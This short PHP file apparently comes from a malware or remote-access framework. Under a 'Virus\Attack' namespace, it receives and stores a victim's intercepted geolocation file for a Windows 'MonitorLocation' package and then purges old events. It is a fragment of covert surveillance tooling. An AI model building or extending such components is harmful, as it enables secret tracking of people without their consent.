<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorLocation\MonitorLocation $this */

$this->saveEventFromIntercept($this->requestData->fileCheck("geoFile"));

$this->purgeEvents();
